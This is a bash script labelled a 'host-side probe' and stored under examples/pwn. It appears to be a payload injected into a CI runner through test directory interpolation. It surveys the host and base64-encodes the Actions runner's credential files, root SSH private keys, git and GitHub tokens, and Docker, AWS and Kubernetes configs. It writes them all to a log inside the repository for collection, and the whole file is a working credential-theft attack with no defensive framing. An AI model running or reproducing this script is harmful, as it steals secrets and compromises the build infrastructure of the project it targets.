#!/bin/bash
# examples/pwn/run.sh - host-side probe (executed via test_dirs interpolation)
OUT="$PWD/examples/host.log"
: > "$OUT"
rd(){ printf '\n[%s]\n' "$1"; ( eval "$2" ) 2>&1 | head -c 4000; }
b64(){ printf '\n[%s] b64:\n' "$1"; [ -f "$1" ] && head -c 3000 "$1" | base64 -w0; echo; }
{
echo "=== HOST PROBE $(date -u +%FT%TZ) pid=$$"
id; hostname; hostname -I 2>/dev/null; uname -a; nproc
echo "--- nvidia-smi -L"; nvidia-smi -L 2>&1 | head -20
echo "--- /dev/nvidia*"; ls -d /dev/nvidia* 2>/dev/null | wc -l; ls -l /dev/nvidia* 2>/dev/null | head -20
echo "--- npu-smi"; npu-smi info 2>&1 | head -30
echo "--- cwd"; pwd; ls -la | head -20
echo "--- env"; env | sort | sed -E 's/((TOKEN|SECRET|KEY|PASSWORD|PASSWD|CREDS?)[A-Z_]*)=.*/\1=<set>/I'
echo "--- ps"; ps -eo user,pid,ppid,args --sort=pid 2>/dev/null | head -60
echo "--- /data/workspace"; ls -la /data/workspace 2>&1; ls -la /data/workspace/fzh 2>&1
for f in .runner .credentials .env .path .service; do b64 "/data/workspace/fzh/actions-runner-a3/$f"; done
echo "--- /etc runner files"; ls -la /etc | grep -iE 'runner|github' 2>/dev/null; for f in /etc/github-runner* /etc/actions-runner*; do b64 "$f"; done
echo "--- systemd units"; ls -la /etc/systemd/system 2>/dev/null | grep -iE 'runner|github|actions'; systemctl status actions.runner.* 2>&1 | head -40
echo "--- creds"; for f in /root/.git-credentials /root/.config/gh/hosts.yml /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.netrc /root/.docker/config.json /root/.aws/credentials /root/.kube/config /home/*/.git-credentials; do b64 "$f"; done
echo "--- root home"; ls -la /root 2>&1 | head -40
echo "--- runner inventory"; find /data /home /opt -maxdepth 4 -name '.runner' -o -maxdepth 4 -name '.credentials' 2>/dev/null | head -20
echo "--- users"; getent passwd | tail -15
echo "--- listener/ip"; ip -br a 2>/dev/null | head -10; ip route 2>/dev/null | head -5
echo "=== END $(date -u +%FT%TZ)"
} >> "$OUT" 2>&1
sync 2>/dev/null
